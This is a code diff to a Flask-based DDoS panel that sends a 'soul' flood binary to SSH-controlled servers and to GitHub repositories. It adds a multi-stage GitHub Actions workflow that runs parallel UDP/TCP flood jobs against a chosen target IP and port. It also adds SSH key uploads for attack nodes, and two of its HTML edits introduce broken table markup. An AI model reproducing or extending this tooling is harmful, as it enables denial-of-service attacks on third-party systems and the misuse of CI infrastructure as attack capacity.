@@ -1,3 +1,4 @@
+
 #!/usr/bin/env python3
 import os
 import socket
@@ -198,12 +199,14 @@ def test_vps_node(node):
     try:
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        if node.vps_password:
+        if node.vps_key_path and os.path.exists(node.vps_key_path):
+            ssh.connect(node.vps_host, port=node.vps_port, username=node.vps_username,
+                        key_filename=node.vps_key_path, timeout=5)
+        elif node.vps_password:
             ssh.connect(node.vps_host, port=node.vps_port, username=node.vps_username,
                         password=node.vps_password, timeout=5)
         else:
-            ssh.connect(node.vps_host, port=node.vps_port, username=node.vps_username,
-                        key_filename=node.vps_key_path, timeout=5)
+            return False, "No authentication method"
         stdin, stdout, stderr = ssh.exec_command("test -f /root/soul && echo 'exists'")
         output = stdout.read().decode().strip()
         ssh.close()
@@ -238,12 +241,14 @@ def distribute_binary_to_vps(node, binary_data):
     try:
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        if node.vps_password:
+        if node.vps_key_path and os.path.exists(node.vps_key_path):
+            ssh.connect(node.vps_host, port=node.vps_port, username=node.vps_username,
+                        key_filename=node.vps_key_path, timeout=10)
+        elif node.vps_password:
             ssh.connect(node.vps_host, port=node.vps_port, username=node.vps_username,
                         password=node.vps_password, timeout=10)
         else:
-            ssh.connect(node.vps_host, port=node.vps_port, username=node.vps_username,
-                        key_filename=node.vps_key_path, timeout=10)
+            return False
         sftp = ssh.open_sftp()
         remote_path = "/root/soul"
         with sftp.open(remote_path, 'wb') as f:
@@ -261,19 +266,76 @@ def distribute_binary_to_vps(node, binary_data):
 # ---------- Attack Triggers ----------
 def trigger_github_node(node, target, port, duration, method):
     binary_method = "udp" if method == "UDP" else "tcp" if method == "TCP" else "udp"
-    try:
-        g = Github(node.github_token)
-        repo = g.get_repo(node.github_repo)
-        yml_content = f"""name: attack
+    # Number of parallel jobs – adjust for more power (max 256)
+    matrix_size = 10
+
+    yml_content = f"""name: Inferno Attack
 on: [push]
+
 jobs:
-  attack:
+
+  stage-0-init:
     runs-on: ubuntu-22.04
+    strategy:
+      matrix:
+        n: [{', '.join(str(i) for i in range(1, matrix_size+1))}]
+    steps:
+      - uses: actions/checkout@v3
+      - name: Make binary executable
+        run: chmod +x soul
+      - name: Initial attack burst (10s)
+        run: ./soul {target} {port} 10 {binary_method}
+
+  stage-1-main:
+    needs: stage-0-init
+    runs-on: ubuntu-22.04
+    strategy:
+      matrix:
+        n: [{', '.join(str(i) for i in range(1, matrix_size+1))}]
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x soul
-      - run: ./soul {target} {port} {duration} {binary_method}
+      - name: Main attack
+        run: ./soul {target} {port} {duration} {binary_method}
+
+  stage-2-calc:
+    runs-on: ubuntu-latest
+    outputs:
+      matrix_list: ${{{{ steps.calc.outputs.matrix_list }}}}
+    steps:
+      - id: calc
+        run: |
+          NUM_JOBS=$(({duration} / 10))
+          if [ $NUM_JOBS -lt 1 ]; then NUM_JOBS=1; fi
+          ARRAY=$(seq 1 $NUM_JOBS | jq -R . | jq -s -c .)
+          echo "matrix_list=$ARRAY" >> $GITHUB_OUTPUT
+
+  stage-2-sequential:
+    needs: [stage-0-init, stage-2-calc]
+    runs-on: ubuntu-22.04
+    strategy:
+      max-parallel: 1
+      matrix:
+        iteration: ${{{{ fromJson(needs.stage-2-calc.outputs.matrix_list) }}}}
+    steps:
+      - uses: actions/checkout@v3
+      - name: Sequential 10s burst
+        run: |
+          chmod +x soul
+          ./soul {target} {port} 10 {binary_method}
+
+  stage-3-cleanup:
+    needs: [stage-1-main, stage-2-sequential]
+    runs-on: ubuntu-22.04
+    if: always()
+    steps:
+      - name: Attack finished
+        run: echo "Attack completed on $(date)"
 """
+
+    try:
+        g = Github(node.github_token)
+        repo = g.get_repo(node.github_repo)
         try:
             contents = repo.get_contents(".github/workflows/main.yml")
             repo.update_file(".github/workflows/main.yml", f"Attack {target}:{port}", yml_content, contents.sha)
@@ -289,12 +351,14 @@ def trigger_vps_node(node, target, port, duration, method):
     try:
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        if node.vps_password:
+        if node.vps_key_path and os.path.exists(node.vps_key_path):
+            ssh.connect(node.vps_host, port=node.vps_port, username=node.vps_username,
+                        key_filename=node.vps_key_path, timeout=10)
+        elif node.vps_password:
             ssh.connect(node.vps_host, port=node.vps_port, username=node.vps_username,
                         password=node.vps_password, timeout=10)
         else:
-            ssh.connect(node.vps_host, port=node.vps_port, username=node.vps_username,
-                        key_filename=node.vps_key_path, timeout=10)
+            return False
         cmd = f"cd /root && ./soul {target} {port} {duration} {binary_method} > /dev/null 2>&1 &"
         ssh.exec_command(cmd)
         ssh.close()
@@ -697,11 +761,24 @@ def admin_add_vps_node():
     port = int(request.form.get('vps_port', 22))
     username = request.form.get('vps_username')
     password = request.form.get('vps_password')
-    key_path = request.form.get('vps_key_path')
     enabled = request.form.get('enabled') == 'on'
     if not name or not host or not username:
         flash('Name, host and username required', 'danger')
         return redirect(url_for('admin_nodes'))
+    
+    key_path = None
+    # Handle uploaded .pem file
+    if 'vps_key_file' in request.files:
+        file = request.files['vps_key_file']
+        if file and file.filename:
+            key_dir = os.path.join(app.root_path, 'keys')
+            os.makedirs(key_dir, exist_ok=True)
+            ext = os.path.splitext(file.filename)[1]
+            safe_name = f"vps_{int(time.time())}_{random.randint(1000,9999)}{ext}"
+            key_path = os.path.join(key_dir, safe_name)
+            file.save(key_path)
+            os.chmod(key_path, 0o600)
+    
     node = AttackNode(
         name=name,
         node_type='vps',
@@ -748,6 +825,11 @@ def admin_toggle_node(node_id):
 def admin_delete_node(node_id):
     node = AttackNode.query.get(node_id)
     if node:
+        if node.vps_key_path and os.path.exists(node.vps_key_path):
+            try:
+                os.remove(node.vps_key_path)
+            except:
+                pass
         db.session.delete(node)
         db.session.commit()
         flash('Node deleted', 'success')
@@ -1019,7 +1101,7 @@ ADMIN_ATTACKS_HTML = '''
 </style>
 </head>
 <body><div class="container"><div class="glass-card"><h2>Attack Logs</h2><a href="/admin/dashboard" class="btn btn-secondary mb-3">← Back</a>
-<div class="table-responsive"><table class="table table-dark"><thead><tr><th>ID</th><th>User ID</th><th>Target</th><th>Port</th><th>Method</th><th>Duration</th><th>Concurrent</th><th>Status</th><th>Time</th></tr></thead><tbody>{% for a in attacks %}<tr><td>{{ a.id }}</td><td>{{ a.user_id }}</td><td>{{ a.target }}</td><td>{{ a.port }}</td><td>{{ a.method }}</td><td>{{ a.duration }}s</td><td>{{ a.concurrent }}</td><td>{{ a.status }}</td><td>{{ a.timestamp.strftime('%Y-%m-%d %H:%M:%S') }}</td></tr>{% endfor %}</tbody></table></div></div></div>
+<div class="table-responsive"><table class="table table-dark"><thead><tr><th>ID</th><th>User ID</th><th>Target</th><th>Port</th><th>Method</th><th>Duration</th><th>Concurrent</th><th>Status</th><th>Time</th></tr></thead><tbody>{% for a in attacks %}<td><td>{{ a.id }}</td><td>{{ a.user_id }}</td><td>{{ a.target }}</td><td>{{ a.port }}</td><td>{{ a.method }}</td><td>{{ a.duration }}s</td><td>{{ a.concurrent }}</td><td>{{ a.status }}</td><td>{{ a.timestamp.strftime('%Y-%m-%d %H:%M:%S') }}</td></tr>{% endfor %}</tbody></table></div></div></div>
 </body></html>
 '''
 
@@ -1051,9 +1133,9 @@ ADMIN_NODES_HTML = '''
 </head>
 <body><div class="container"><div class="glass-card"><h2>Attack Node Management</h2><a href="/admin/dashboard" class="btn btn-secondary mb-3">← Back</a>
 <div class="row g-4"><div class="col-md-6"><div class="card bg-dark"><div class="card-header">➕ Add GitHub Node</div><div class="card-body"><form method="POST" action="/admin/nodes/add_github"><input type="text" name="name" placeholder="Node Name" class="form-control mb-2" required><input type="text" name="github_token" placeholder="GitHub Token" class="form-control mb-2" required><input type="text" name="github_repo" placeholder="Repo Name (default: InfernoCore)" class="form-control mb-2"><div class="form-check mb-2"><input type="checkbox" name="enabled" class="form-check-input" checked> <label class="form-check-label">Enabled</label></div><button type="submit" class="btn btn-primary">Add GitHub Node</button></form></div></div></div>
-<div class="col-md-6"><div class="card bg-dark"><div class="card-header">➕ Add VPS Node</div><div class="card-body"><form method="POST" action="/admin/nodes/add_vps"><input type="text" name="name" placeholder="Node Name" class="form-control mb-2" required><input type="text" name="vps_host" placeholder="VPS Host (IP)" class="form-control mb-2" required><input type="number" name="vps_port" placeholder="Port (default 22)" class="form-control mb-2" value="22"><input type="text" name="vps_username" placeholder="Username" class="form-control mb-2" required><input type="password" name="vps_password" placeholder="Password (or leave empty for key)" class="form-control mb-2"><input type="text" name="vps_key_path" placeholder="SSH Key Path" class="form-control mb-2"><div class="form-check mb-2"><input type="checkbox" name="enabled" class="form-check-input" checked> <label class="form-check-label">Enabled</label></div><button type="submit" class="btn btn-primary">Add VPS Node</button></form></div></div></div></div>
+<div class="col-md-6"><div class="card bg-dark"><div class="card-header">➕ Add VPS Node</div><div class="card-body"><form method="POST" action="/admin/nodes/add_vps" enctype="multipart/form-data"><input type="text" name="name" placeholder="Node Name" class="form-control mb-2" required><input type="text" name="vps_host" placeholder="VPS Host (IP)" class="form-control mb-2" required><input type="number" name="vps_port" placeholder="Port (default 22)" class="form-control mb-2" value="22"><input type="text" name="vps_username" placeholder="Username" class="form-control mb-2" required><input type="password" name="vps_password" placeholder="Password (or leave empty for key)" class="form-control mb-2"><div class="mb-2"><label>SSH Private Key (.pem file) – optional</label><input type="file" name="vps_key_file" class="form-control" accept=".pem,.key"><small class="text-muted">If provided, password will be ignored.</small></div><div class="form-check mb-2"><input type="checkbox" name="enabled" class="form-check-input" checked> <label class="form-check-label">Enabled</label></div><button type="submit" class="btn btn-primary">Add VPS Node</button></form></div></div></div></div>
 <div class="card bg-dark mt-4"><div class="card-header">📤 Distribute Binary</div><div class="card-body"><form method="POST" action="/admin/upload_binary" enctype="multipart/form-data" class="row g-2"><div class="col-md-8"><input type="file" name="binary" class="form-control bg-dark text-white" required></div><div class="col-md-4"><button type="submit" class="btn btn-warning">Upload & Distribute</button></div></form><small class="text-muted">Upload your compiled 'soul' binary. It will be sent to all enabled nodes.</small></div></div>
-<div class="table-responsive mt-4"><table class="table table-dark"><thead><tr><th>Name</th><th>Type</th><th>Enabled</th><th>Status</th><th>Binary</th><th>Details</th><th>Actions</th></tr></thead><tbody>{% for n in nodes %}<tr><td>{{ n.name }}</td><td>{{ n.node_type }}</td><td>{% if n.enabled %}<span class="text-success">✔</span>{% else %}<span class="text-danger">✘</span>{% endif %}</td><td class="{% if n.last_status == 'online' %}status-online{% else %}status-offline{% endif %}">{{ n.last_status|default('unknown') }}</td><td>{% if n.binary_present %}<span class="text-success">✓</span>{% else %}<span class="text-danger">✗</span>{% endif %}</td><td>{% if n.node_type=='github' %}{{ n.github_repo }}{% else %}{{ n.vps_host }}:{{ n.vps_port }}{% endif %}</td><td><form method="POST" action="/admin/nodes/{{ n.id }}/check" style="display:inline"><button class="btn btn-sm btn-info">Check</button></form> <form method="POST" action="/admin/nodes/{{ n.id }}/toggle" style="display:inline"><button class="btn btn-sm btn-warning">Toggle</button></form> <form method="POST" action="/admin/nodes/{{ n.id }}/delete" style="display:inline" onsubmit="return confirm('Delete node?')"><button class="btn btn-sm btn-danger">Delete</button></form></td></tr>{% endfor %}</tbody></table></div></div></div>
+<div class="table-responsive mt-4"><table class="table table-dark"><thead><tr><th>Name</th><th>Type</th><th>Enabled</th><th>Status</th><th>Binary</th><th>Details</th><th>Actions</th><tr></thead><tbody>{% for n in nodes %}<tr><td>{{ n.name }}</td><td>{{ n.node_type }}</td><td>{% if n.enabled %}<span class="text-success">✔</span>{% else %}<span class="text-danger">✘</span>{% endif %}</td><td class="{% if n.last_status == 'online' %}status-online{% else %}status-offline{% endif %}">{{ n.last_status|default('unknown') }}</td><td>{% if n.binary_present %}<span class="text-success">✓</span>{% else %}<span class="text-danger">✗</span>{% endif %}</td><td>{% if n.node_type=='github' %}{{ n.github_repo }}{% else %}{{ n.vps_host }}:{{ n.vps_port }}{% endif %}</td><td><form method="POST" action="/admin/nodes/{{ n.id }}/check" style="display:inline"><button class="btn btn-sm btn-info">Check</button></form> <form method="POST" action="/admin/nodes/{{ n.id }}/toggle" style="display:inline"><button class="btn btn-sm btn-warning">Toggle</button></form> <form method="POST" action="/admin/nodes/{{ n.id }}/delete" style="display:inline" onsubmit="return confirm('Delete node?')"><button class="btn btn-sm btn-danger">Delete</button></form></td></tr>{% endfor %}</tbody></table></div></div></div>
 </body></html>
 '''
 
